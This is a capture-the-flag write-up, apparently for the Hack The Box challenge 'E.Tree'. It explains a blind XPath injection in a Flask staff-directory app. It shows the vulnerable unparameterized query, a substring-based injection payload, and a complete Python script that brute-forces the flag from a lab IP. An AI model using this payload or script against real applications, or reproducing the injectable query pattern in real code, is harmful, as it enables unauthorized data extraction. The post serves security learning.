---
layout: post
title:  "E.Tree"
date:   2025-03-19 12:32:45 +0100
permalink: /hackthebox/etree/
---


# HTB - E.Tree
---
> Author: Makelaris
> Published: March 19, 2025
> Description: After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?

---



<br>

There are two pages in the application:

1. **Index Page**: This page allow us to enter a name. After entering the name, it send a post request to `/api/search` endpoint. If the name exist, we got a message “This military staff member exists.”. Otherwise, we get this message “This military staff member does not exist.”.
2. **Leaderboard Page**: This page shows a list of users with the best scores.

Let’s go to the source code to see how these 2 routes define. 

![image.png](/assets/images/etree/image.png)

![image.png](/assets/images/etree/image1.png)

![image.png](/assets/images/etree/image2.png)

![image.png](/assets/images/etree/image3.png)

![image.png](/assets/images/etree/image4.png)

## ***Objective***

The flag is split into two parts within the `military.xml` file. The first part is stored inside the `<selfDestructCode>` tag of `staff` element, and the second part is in another `<selfDestructCode>` tag belonging to a different staff element. If we can somehow extract both parts and combine them, we can reveal the full flag.

```xml
 
  <staff>
            <name>Groorg</name>
            <age>52420</age>
            <rank>Colonel</rank>
            <kills>4112825</kills>
            <selfDestructCode>HTB{f4k3_fl4g_</selfDestructCode>
   </staff>
 
 
 <staff>
            <name>Bobhura</name>
            <age>61792</age>
            <rank>Magor</rank>
            <kills>5076298</kills>
            <selfDestructCode>f0r_t3st1ng}</selfDestructCode>
  </staff>
```
<br>
There are 3 routes define in `routes.py`, but the only one that accepts user input is `/search`, so that’s the one we’ll focus on.

The route handles POST requests, taking a name from the request data and passing it to the `search_staff` function. This function comes from `util.py`, is used for checking if the given name exists in the system and returning the appropriate response.

```python
from flask import Blueprint, render_template, request
from application.util import leaderboard, search_staff

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/leaderboard')
def web_leaderboard():
    return render_template('leaderboard.html', leaderboard=leaderboard('DSC-N-1547'))
    
@api.route('/search', methods=['POST'])
def api_search():
    name = request.json.get('search', '')
    return search_staff(name)

```
<br>

Inside the `util.py`, it first loads and  parses the `military.xml`. Our input (name) is directly inserted into an XPath query and runs the search. If a match is found, it returns a success message. 

Since there are no filter on our input, we can escape and inject malicious XPath queries. Also, since the response messages is hardcoded, this could lead to a blind XPath injection. 

[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)

[XPath-Injection](https://www.imperva.com/learn/application-security/xpath-injection/)

```python
from lxml import etree

tree = etree.parse('military.xml')

def search_staff(name):
    # who cares about parameterization
    query = f"/military/district/staff[name='{name}']"
    
    if tree.xpath(query):
        return {'success': 1, 'message': 'This millitary staff member exists.'}

    return {'failure': 1, 'message': 'This millitary staff member does not exist.'}

```
<br>

***Exploitation***

Since the 2 parts of the flag are stored in staff members named `Groorg` and `Bobhura`, we can substring the `selfDestructCode`  from each.  Because the flag always starts with letter `H`, we can use this to confirm and create an exploit script. 

```json
{"search":"Groorg' and substring(selfDestructCode,1,1)='H"}
```

![image.png](/assets/images/etree/image5.png)

`Exploit.py`

```python
import requests
import string

letters = string.ascii_letters + string.digits + "@#!?_{}$"

url = "http://94.237.54.190:30894/api/search"
def extract1(url,name):
    flag = ''
    found = False
    for i in range(1, 40+1):
        for l in letters:
            query = {"search": f"{name}' and substring(selfDestructCode,{i},1)='{l}"}
            response = requests.post(url, json=query)
            if response.json()['message'] == 'This millitary staff member exists.':
                flag += l
                print("[+] Flag: ", flag + '\r', end='')
                found = True
                break
        if not found:
            break
    return flag

def main():
    names = ['Groorg', 'Bobhura']
    final_flag = ''

    for name in names:
        print(f"[+] Extracting Flag for {name}")
        flag = extract1(url,name)
        final_flag += flag
        print(f"[+] Final Extracted Flag: {flag}")
    print(f"[+] Final Extracted Flag: {final_flag}")

if __name__ == "__main__":
    main()

```

![image.png](/assets/images/etree/image6.png)

## ***What I’ve Leanred***

<aside>
💡

Blind XPath Injection


